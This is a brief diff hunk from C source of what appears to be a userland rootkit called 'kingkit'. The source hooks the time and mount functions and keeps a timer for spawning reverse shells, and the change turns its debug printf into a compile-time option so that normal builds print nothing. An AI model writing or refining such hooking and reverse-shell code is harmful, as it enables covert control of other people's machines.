@@ -830,7 +830,7 @@ int mount(const char *source, const char *target, const char *filesystemtype, un
 static time_t last_time = 0; //time the last reverse shell was spawned
 
 time_t time(time_t *tloc) {
-    #if 1
+    #if DEBUG
     printf("[kingkit] time called.\n");
     #endif
     original_time = syscall_address(original_time, "time");
